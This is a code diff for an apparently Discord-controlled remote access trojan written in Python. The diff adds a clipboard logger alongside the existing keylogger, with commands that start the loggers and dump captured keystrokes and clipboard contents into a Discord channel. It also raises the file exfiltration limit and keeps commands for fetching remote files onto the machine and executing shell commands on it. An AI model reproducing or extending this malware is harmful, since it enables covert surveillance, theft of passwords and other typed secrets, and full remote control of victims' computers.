@@ -1,17 +1,19 @@
 import os, datetime, pyautogui, subprocess, zipfile, requests, cv2
 import discord, io
 
-from Logger import Keylogger
+from Clip_logging import Cliplogger
+from Key_logging import Keylogger
 from urllib.parse import urlparse
 from discord.ext import commands
 
-TOKEN = 'TOKEN'
+TOKEN = 'YOUR_TOKEN_HERE'
 
 intent = discord.Intents.all()
 intent.message_content = True
 
 bot = commands.Bot(command_prefix=".", intents=intent)
-logger = Keylogger()
+klogger = Keylogger()
+clogger = Cliplogger()
 
 @bot.event
 async def on_command_error(ctx: commands.Context, error):
@@ -24,27 +26,44 @@ async def hello(ctx: commands.Context):
     await ctx.send(f"hello, welcome! {ctx.author.mention}")
 
 @bot.command()
+async def cliplog_start(ctx: commands.Context):
+    await ctx.send("starting cliplogger..")
+    clogger.start_cliplog()
+    await ctx.send("cliplogger started!")
+
+@bot.command()
+async def cliplog_read(ctx: commands.Context):
+    output = clogger.wrap_read_cliplog()
+    await ctx.send(f"**cliplogger dump:**\n```\n{output}\n```")
+
+@bot.command()
+async def cliplog_stop(ctx: commands.Context):
+    await ctx.send("stopping cliplogger..")
+    clogger.stop_cliplog()
+    await ctx.send("cliplogger stopped!")
+
+@bot.command()
 async def keylog_start(ctx: commands.Context):
     await ctx.send("starting keylogger..")
-    logger.start_log()
+    klogger.start_log()
     await ctx.send("keylogger started!")
 
 @bot.command()
 async def keylog_read(ctx: commands.Context):
-    data = logger.baca_log()
+    data = klogger.baca_log()
     await ctx.send(f"**keylogger dump:**\n```\n{data}\n```")
 
 @bot.command()
 async def keylog_stop(ctx: commands.Context):
     await ctx.send("stopping keylogger..")
-    logger.stop_listener()
+    klogger.stop_listener()
     await ctx.send("keylogger stopped!")
 
 @bot.command()
-async def upload(cxt: commands.Context, url=None, local_file=None):
+async def upload(ctx: commands.Context, url=None, local_file=None):
 
     if not url:
-        await cxt.send("enter a url to request a file into")
+        await ctx.send("enter a url to request a file into")
         return
     
     try:
@@ -55,7 +74,7 @@ async def upload(cxt: commands.Context, url=None, local_file=None):
             if not local_file:
                 local_file = "WUFDGZ.html"
         
-        await cxt.send(f"connecting to '{url}'")
+        await ctx.send(f"connecting to '{url}'")
 
         with requests.get(url, stream=True, timeout=30) as res:
             res.raise_for_status()
@@ -64,26 +83,26 @@ async def upload(cxt: commands.Context, url=None, local_file=None):
                     if chunk:
                         file.write(chunk)
 
-        await cxt.send("file is successfully uploaded")
+        await ctx.send("file is successfully uploaded")
     
     except requests.exceptions.HTTPError as e:
-        await cxt.send(f"the server responded with status code: {res.status_code}\n```detail:\n{e}\n```")
+        await ctx.send(f"the server responded with status code: {res.status_code}\n```detail:\n{e}\n```")
     except requests.exceptions.ConnectionError as e:
-        await cxt.send(f"can't connect to server ```detail:\n{e}\n```")
+        await ctx.send(f"can't connect to server ```detail:\n{e}\n```")
     except requests.exceptions.Timeout as e:
-        await cxt.send("connection timed out by 30sec")
+        await ctx.send("connection timed out by 30sec")
     except requests.exceptions.RequestException as e:
-        await cxt.send(f"unknown error has occured ```detail:\n{e}\n```")
+        await ctx.send(f"unknown error has occured ```detail:\n{e}\n```")
     except PermissionError:
-        await cxt.send(f"you have no permission to write '{local_file}' file")
+        await ctx.send(f"you have no permission to write '{local_file}' file")
     except OSError as e:
-        await cxt.send(f"{e}")
+        await ctx.send(f"{e}")
     except Exception as e:
-        await cxt.send(f"{e}")
+        await ctx.send(f"{e}")
 
 @bot.command()
 async def download(ctx: commands.Context, file):
-    limit = 20 * 1024
+    limit = 20 * 1024 * 1024
     zipped = f"{file}.zip"
 
     if not file:
@@ -105,6 +124,21 @@ async def download(ctx: commands.Context, file):
     else:
         with open(file, 'rb') as f:
             await ctx.send("file is ready to download:", file=discord.File(f))
+
+@bot.command()
+async def size(ctx: commands.Context, file):
+    try:
+        if os.path.exists(file) and os.path.isfile(file):
+            filesize = os.path.getsize(file)
+            await ctx.send(f"the file size of '{file}' is {str(filesize)} byte")
+        else:
+            await ctx.send(f"can't get the size of '{file}', file not found")
+    except TypeError:
+        await ctx.send(f"the path must be string or a byte object")
+    except ValueError:
+        await ctx.send(f"the path contains invalid characters")
+    except OSError as e:
+        await ctx.send(f"{e}")
 
 @bot.command()
 async def exe(ctx: commands.Context,*, cmd: str = None):
@@ -228,6 +262,5 @@ async def cd(ctx: commands.Context,*, path: str = None):
         await ctx.send(f"you have no permission to access '{path}' directory")
     except NotADirectoryError:
         await ctx.send(f"This is a file, not a directory")
-
 
 bot.run(TOKEN, reconnect=True)
